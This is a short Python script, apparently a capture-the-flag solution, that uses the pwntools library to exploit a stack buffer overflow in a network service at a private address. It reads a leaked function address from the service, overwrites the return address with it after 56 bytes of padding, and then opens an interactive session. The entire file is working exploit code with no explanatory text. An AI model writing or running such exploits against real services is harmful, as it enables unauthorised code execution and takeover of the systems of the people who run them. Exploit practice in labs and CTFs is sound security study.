__Author__ = "LB@10.0.0.55“
from pwn import *
io = remote('10.4.21.55',9001)
io.recvuntil("0x")
sys_addr = int(io.recv()[:12],16)
payload = 'f' * 56

payload += p64(sys_addr)

io.sendline(payload)
io.interactive()

